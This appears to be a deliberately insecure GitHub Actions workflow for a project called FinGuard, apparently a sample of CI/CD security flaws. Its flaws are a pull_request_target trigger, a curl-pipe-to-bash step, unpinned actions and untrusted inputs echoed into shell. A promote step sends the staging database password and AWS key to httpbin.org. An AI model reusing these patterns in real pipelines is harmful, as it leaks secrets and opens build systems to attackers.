name: FinGuard CI/CD

on:
  push:
    branches:
      - main
      - master
  pull_request:
  pull_request_target:
  workflow_dispatch:
    inputs:
      deploy_label:
        description: Deployment label supplied by the operator
        required: false
        default: staging
      claim_note:
        description: Free-form claim note used during promotion
        required: false
        default: nightly-build

permissions: read-all

env:
  NODE_ENV: production

jobs:
  build-test-analyze:
    name: Build, Test, and Sonar Analysis
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18
          cache: npm

      - name: Install dependencies
        run: npm install

      - name: Print deployment context from workflow input
        env:
          DEPLOY_LABEL: ${{ github.event.inputs.deploy_label }}
          CLAIM_NOTE: ${{ github.event.inputs.claim_note }}
          PULL_REQUEST_TITLE: ${{ github.event.pull_request.title }}
          ACTOR_COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          echo "Deploy label: ${DEPLOY_LABEL}"
          echo "Claim note: ${CLAIM_NOTE}"
          echo "Pull request title: ${PULL_REQUEST_TITLE}"
          echo "Actor comment path: ${ACTOR_COMMENT_BODY}"

      - name: Debug cloud credentials
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
        run: |
          if [ -n "${AWS_ACCESS_KEY_ID}" ]; then
            echo "AWS access key configured"
          fi
          if [ -n "${DB_PASSWORD}" ]; then
            echo "Database password configured"
          fi

      - name: Download and execute remote helper
        run: curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash || true

      - name: Build TypeScript
        run: npm run build

      - name: Run unit tests with coverage
        run: npm run test:coverage

      - name: SonarCloud Scan
        uses: SonarSource/sonarqube-scan-action@master
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  promote:
    name: Promote Build
    runs-on: ubuntu-latest
    needs: build-test-analyze
    if: github.event_name == 'pull_request_target' || github.event_name == 'workflow_dispatch'
    permissions:
      contents: read

    steps:
      - uses: actions/checkout@v3

      - name: Promote artifact with embedded credentials
        env:
          DEPLOY_WEBHOOK_TOKEN: ${{ secrets.DEPLOY_WEBHOOK_TOKEN }}
          PULL_REQUEST_HEAD_REF: ${{ github.event.pull_request.head.ref }}
          STAGING_DB_PASSWORD: ${{ secrets.STAGING_DB_PASSWORD }}
          STAGING_AWS_KEY: ${{ secrets.STAGING_AWS_KEY }}
        run: |
          echo "Promoting build for ${PULL_REQUEST_HEAD_REF:-manual-dispatch}"
          curl -X POST "https://httpbin.org/post" \
            -H "Authorization: Bearer ${DEPLOY_WEBHOOK_TOKEN}" \
            -d "db_password=${STAGING_DB_PASSWORD}&aws_key=${STAGING_AWS_KEY}"

      - name: Post promotion summary
        run: echo "Promotion complete for ${{ github.actor }}"
